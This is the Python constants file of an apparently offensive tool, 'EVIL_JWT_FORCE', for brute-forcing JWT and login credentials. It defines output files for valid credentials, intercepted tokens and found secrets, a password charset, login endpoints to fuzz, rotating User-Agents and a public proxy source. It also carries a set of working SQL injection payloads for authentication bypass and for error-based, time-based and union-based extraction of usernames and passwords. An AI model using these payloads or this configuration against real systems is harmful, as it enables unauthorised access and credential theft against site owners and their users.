"""
EVIL_JWT_FORCE Constants Module
Constantes globais avançadas utilizadas no projeto
"""

import os
from pathlib import Path

# Diretórios base
BASE_DIR = Path(__file__).resolve().parent.parent
CONFIG_DIR = BASE_DIR / "config"
OUTPUT_DIR = BASE_DIR / "output"
LOGS_DIR = BASE_DIR / "logs"
REPORTS_DIR = BASE_DIR / "reports"
SCRIPTS_DIR = BASE_DIR / "scripts"
EXPORTS_DIR = BASE_DIR / "exports"

# Função utilitária para garantir existência de diretórios essenciais
def ensure_dirs():
    for d in [CONFIG_DIR, OUTPUT_DIR, LOGS_DIR, REPORTS_DIR, SCRIPTS_DIR, EXPORTS_DIR]:
        d.mkdir(parents=True, exist_ok=True)
ensure_dirs()

# Configurações de JWT
JWT_ALGORITHMS = [
    'HS256', 'HS384', 'HS512',
    'RS256', 'RS384', 'RS512',
    'ES256', 'ES384', 'ES512',
    'PS256', 'PS384', 'PS512',
    'EdDSA'
]
JWT_HEADER_TYPES = ['JWT', 'Bearer', 'OAuth', 'ApiKey']

# Configurações de timeout e retry
DEFAULT_TIMEOUT = 30
MAX_RETRIES = 5
RETRY_DELAY = 5

# Headers padrão e User-Agents avançados
DEFAULT_HEADERS = {
    'User-Agent': 'EVIL-JWT-FORCE/2.0 (+https://github.com/eviljwtforce)',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json'
}
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
]

# Arquivos de output
VALID_CREDS_FILE = OUTPUT_DIR / "valid_credentials.txt"
INVALID_CREDS_FILE = OUTPUT_DIR / "fail_credentials.txt"
INTERCEPTED_TOKENS_FILE = OUTPUT_DIR / "intercepted_tokens.txt"
FOUND_SECRETS_FILE = OUTPUT_DIR / "found_secrets.txt"
WORDLIST_FILE = OUTPUT_DIR / "wordlist.txt"
WORDLIST_TESTED_FILE = OUTPUT_DIR / "wordlist_tested.txt"
REPORT_HTML_FILE = OUTPUT_DIR / "report.html"
REPORT_JSON_FILE = OUTPUT_DIR / "report.json"

# Configurações de wordlist
MIN_PASSWORD_LENGTH = 4
MAX_PASSWORD_LENGTH = 64
DEFAULT_CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=,.?'

# Configurações de logging
LOG_FORMAT = '[%(asctime)s] [%(levelname)s] %(message)s'
LOG_DATE_FORMAT = '%Y-%m-%d %H:%M:%S'
LOG_LEVELS = {
    'DEBUG': 10,
    'INFO': 20,
    'WARNING': 30,
    'ERROR': 40,
    'CRITICAL': 50
}
LOG_FILES = {
    'BRUTEFORCE': LOGS_DIR / "bruteforce.log",
    'ERRORS': LOGS_DIR / "errors.log"
}

# Cores para output no terminal (ANSI)
COLORS = {
    'SUCCESS': '\033[92m',
    'WARNING': '\033[93m',
    'ERROR': '\033[91m',
    'INFO': '\033[94m',
    'RESET': '\033[0m'
}

# Endpoints comuns para varredura e fuzzing
COMMON_ENDPOINTS = [
    '/api/auth', '/api/login', '/auth/token', '/oauth/token',
    '/api/v1/auth', '/api/v2/auth', '/auth/jwt', '/login',
    '/admin/login', '/user/login', '/token', '/session', '/signin', '/authenticate'
]

# Payloads SQL comuns e avançados
SQL_PAYLOADS = {
    'auth_bypass': [
        "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR '1'='1' #", "\" OR \"1\"=\"1", "' OR 1=1#", "\" OR 1=1#"
    ],
    'error_based': [
        "' AND 1=1--", "' AND 1=2--", "' AND ERROR()--", "' AND 1=CONVERT(int,@@version)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x716b6b6b71,(SELECT (SELECT (SELECT CONCAT(0x71716b6b71,IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM information_schema.schemata LIMIT 0,1)),0x716b6b6b71,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ],
    'time_based': [
        "' AND SLEEP(5)--", "' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--", "' WAITFOR DELAY '0:0:5'--"
    ],
    'union_based': [
        "' UNION SELECT NULL--", "' UNION SELECT username, password FROM users--"
    ]
}

# Status codes HTTP
HTTP_STATUS = {
    'OK': 200,
    'CREATED': 201,
    'ACCEPTED': 202,
    'NO_CONTENT': 204,
    'BAD_REQUEST': 400,
    'UNAUTHORIZED': 401,
    'FORBIDDEN': 403,
    'NOT_FOUND': 404,
    'SERVER_ERROR': 500,
    'TOO_MANY_REQUESTS': 429
}

# Configurações de proxy
PROXY_FILE = CONFIG_DIR / "proxies.txt"
PROXY_API_URL = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all"

# Outras constantes globais
VERSION = "2.0.0"
PROJECT_NAME = "EVIL_JWT_FORCE"
AUTHOR = "EVIL_JWT_FORCE Team"
LICENSE = "MIT"